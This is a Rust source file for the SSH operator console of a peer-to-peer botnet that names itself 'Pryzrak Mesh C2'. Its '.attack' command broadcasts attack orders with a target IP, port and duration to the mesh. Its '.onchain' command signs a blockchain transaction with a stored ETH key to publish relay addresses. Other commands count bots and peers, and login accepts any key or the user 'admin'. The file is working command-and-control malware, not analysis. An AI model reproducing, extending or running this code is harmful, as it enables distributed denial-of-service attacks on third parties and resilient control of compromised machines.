use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use std::path::PathBuf;
use async_trait::async_trait;
use russh::{server, Channel, ChannelId, CryptoVec};
use russh_keys::key;
use log::info;
use crate::network::P2PService;

const RESET: &str = "\x1b[0m";
const BOLD: &str = "\x1b[1m";
const DIM: &str = "\x1b[2m";
const RED: &str = "\x1b[31m";
const GREEN: &str = "\x1b[32m";
const YELLOW: &str = "\x1b[33m";
const CYAN: &str = "\x1b[36m";

pub struct ServerState {
    pub clients: HashMap<ChannelId, usize>,
}

pub struct SessionState {
    pub is_busy: bool,
}

#[derive(Clone)]
pub struct PryzrakServer {
    pub state: Arc<Mutex<ServerState>>,
    pub master_key: Arc<ed25519_dalek::SigningKey>,
    pub p2p_service: Arc<P2PService>,
    pub keys_dir: PathBuf,
}

impl PryzrakServer {
    pub fn new(master_key: Arc<ed25519_dalek::SigningKey>, p2p_service: Arc<P2PService>, keys_dir: PathBuf) -> Self {
        Self {
            state: Arc::new(Mutex::new(ServerState { clients: HashMap::new() })),
            master_key,
            p2p_service,
            keys_dir,
        }
    }
}

pub struct PryzrakSession {
    pub state: Arc<Mutex<ServerState>>,
    pub session_state: Arc<Mutex<SessionState>>,
    pub master_key: Arc<ed25519_dalek::SigningKey>,
    pub p2p_service: Arc<P2PService>,
    pub keys_dir: PathBuf,
    pub cmd_buffer: String,
}

fn send(session: &mut server::Session, channel: ChannelId, msg: &str) {
    session.data(channel, CryptoVec::from_slice(msg.as_bytes()));
}

fn prompt(session: &mut server::Session, channel: ChannelId) {
    send(session, channel, &format!("{}pryzrak{} ~$ ", CYAN, RESET));
}

#[async_trait]
impl server::Handler for PryzrakSession {
    type Error = anyhow::Error;

    async fn channel_open_session(
        self,
        _channel: Channel<server::Msg>,
        session: server::Session,
    ) -> Result<(Self, bool, server::Session), Self::Error> {
        Ok((self, true, session))
    }
    
    async fn shell_request(
        self,
        _channel: ChannelId,
        session: server::Session,
    ) -> Result<(Self, server::Session), Self::Error> {
        Ok((self, session))
    }
    
    async fn pty_request(
        self,
        channel: ChannelId,
        _term: &str,
        _col_width: u32,
        _row_height: u32,
        _pix_width: u32,
        _pix_height: u32,
        _modes: &[(russh::Pty, u32)],
        mut session: server::Session,
    ) -> Result<(Self, server::Session), Self::Error> {
        // Ubuntu style: No clear, just newlines and banner
        send(&mut session, channel, "\r\n");
        send(&mut session, channel, &format!("{}Pryzrak Mesh C2{} v1.0\r\n", BOLD, RESET));
        send(&mut session, channel, &format!("{}Type 'help' for commands{}\r\n\r\n", DIM, RESET));
        prompt(&mut session, channel);
        Ok((self, session))
    }

    async fn auth_publickey(
        self,
        _user: &str,
        _public_key: &key::PublicKey,
    ) -> Result<(Self, server::Auth), Self::Error> {
        Ok((self, server::Auth::Accept))
    }

    async fn auth_password(
        self,
        user: &str,
        _password: &str,
    ) -> Result<(Self, server::Auth), Self::Error> {
        if user == "admin" {
            Ok((self, server::Auth::Accept))
        } else {
            Ok((self, server::Auth::Reject { proceed_with_methods: None }))
        }
    }

    async fn data(
        mut self,
        channel: ChannelId,
        data: &[u8],
        mut session: server::Session,
    ) -> Result<(Self, server::Session), Self::Error> {
        // Strict Blocking: If busy, ignore ALL input
        let is_busy = {
            let state = self.session_state.lock().unwrap();
            state.is_busy
        };
        
        if is_busy {
            return Ok((self, session));
        }

        for &byte in data {
            match byte {
                b'\r' | b'\n' => {
                    send(&mut session, channel, "\r\n");
                    let cmd = self.cmd_buffer.trim().to_string();
                    self.cmd_buffer.clear();
                    
                    if !cmd.is_empty() {
                        // Extract fields to avoid 'self' borrow issues
                        let session_state_lock_handle = self.session_state.clone();
                        let session_state_for_spawn = self.session_state.clone();
                        let p2p = self.p2p_service.clone();
                        let keys_dir = self.keys_dir.clone();
                        let cmd_string = cmd.clone();

                        // Mark as busy immediately using local clone
                        {
                            let mut state = session_state_lock_handle.lock().unwrap();
                            state.is_busy = true;
                        }

                        let mut handle = session.handle();
                        
                        tokio::spawn(async move {
                            // Execute command logic
                            let mut output = String::new();
                            let session_state = session_state_for_spawn;
                            
                            match cmd_string.as_str() {
                                "help" => {
                                    output.push_str(&format!(
                                        "{}Commands:{}\r\n  {}.attack{} <ip> <port> <dur>\r\n  {}.onchain{} <ip:port>,...\r\n  {}.count{}\r\n  {}.peers{}\r\n  {}clear{}\r\n",
                                        BOLD, RESET, GREEN, RESET, GREEN, RESET, GREEN, RESET, GREEN, RESET, GREEN, RESET
                                    ));
                                }
                                "clear" => {
                                    output.push_str("\x1b[H\x1b[2J\x1b[3J");
                                }
                                ".peers" => {
                                    let count = p2p.get_peer_count();
                                    output.push_str(&format!("{}[*]{} Peers: {}\r\n", YELLOW, RESET, count));
                                }
                                ".count" => {
                                    let _ = handle.data(channel, CryptoVec::from_slice(format!("{}[*]{} Counting nodes (5s)...\r\n", YELLOW, RESET).as_bytes())).await;
                                    let (c, e) = p2p.request_count(5).await;
                                    output.push_str(&format!("Cloud: {} Edge: {} {}Total: {}{}\r\n", c, e, GREEN, c as u32 + e, RESET));
                                }
                                _ if cmd_string.starts_with(".attack ") => {
                                    let p: Vec<&str> = cmd_string.split_whitespace().collect();
                                    if p.len() >= 4 {
                                        let ip: std::net::Ipv4Addr = p[1].parse().unwrap_or(std::net::Ipv4Addr::new(0,0,0,0));
                                        let port: u16 = p[2].parse().unwrap_or(0);
                                        let dur: u32 = p[3].parse().unwrap_or(0);
                                        let mut payload = vec![1u8];
                                        payload.extend_from_slice(&u32::from(ip).to_be_bytes());
                                        payload.extend_from_slice(&port.to_be_bytes());
                                        payload.extend_from_slice(&dur.to_be_bytes());
                                        p2p.broadcast_command(payload).await;
                                        output.push_str(&format!("{}[+]{} Attack sent\r\n", GREEN, RESET));
                                    } else {
                                        output.push_str(&format!("{}[-]{} Usage: .attack <ip> <port> <dur>\r\n", RED, RESET));
                                    }
                                }
                                _ if cmd_string.starts_with(".onchain ") => {
                                    let addr_str = cmd_string.strip_prefix(".onchain ").unwrap_or("").trim();
                                    let addrs: Vec<&str> = addr_str.split(',').map(|s| s.trim()).filter(|s| !s.is_empty()).collect();
                                    if addrs.is_empty() {
                                        output.push_str(&format!("{}[-]{} Usage: .onchain <ip:port>\r\n", RED, RESET));
                                    } else {
                                        let eth_path = keys_dir.join("eth.key");
                                        let mut eth_key = std::fs::read_to_string(&eth_path).unwrap_or_default().trim().to_string();
                                        if !eth_key.starts_with("0x") && !eth_key.is_empty() { eth_key = format!("0x{}", eth_key); }
                                        if eth_key.is_empty() || eth_key == "0x" {
                                            output.push_str(&format!("{}[-]{} No ETH key\r\n", RED, RESET));
                                        } else {
                                            let payload = addrs.join(";").into_bytes();
                                            match crate::network::broadcast_signal(&eth_key, payload).await {
                                                Ok(tx) => output.push_str(&format!("{}[+]{} TX: {}\r\n", GREEN, RESET, tx)),
                                                Err(e) => output.push_str(&format!("{}[-]{} {}\r\n", RED, RESET, e)),
                                            }
                                        }
                                    }
                                }
                                _ => {
                                    output.push_str(&format!("{}[-]{} Unknown cmd\r\n", RED, RESET));
                                }
                            }
                            
                            // Send Output
                            if !output.is_empty() {
                                let _ = handle.data(channel, CryptoVec::from_slice(output.as_bytes())).await;
                            }
                            
                            // Send Prompt
                            let prompt = format!("{}pryzrak{} ~$ ", CYAN, RESET);
                            let _ = handle.data(channel, CryptoVec::from_slice(prompt.as_bytes())).await;
                            
                            // Unlock input
                            {
                                let mut state = session_state.lock().unwrap();
                                state.is_busy = false;
                            }
                        });
                    } else {
                        prompt(&mut session, channel);
                    }
                }
                0x7f | 0x08 => {
                    if !self.cmd_buffer.is_empty() {
                        self.cmd_buffer.pop();
                        send(&mut session, channel, "\x08 \x08");
                    }
                }
                0x03 => {
                    self.cmd_buffer.clear();
                    send(&mut session, channel, "^C\r\n");
                    prompt(&mut session, channel);
                }
                32..=126 => {
                    self.cmd_buffer.push(byte as char);
                    send(&mut session, channel, &String::from(byte as char));
                }
                _ => {}
            }
        }
        Ok((self, session))
    }
}

impl PryzrakSession {
    // Helper removed, logic moved to spawn
}
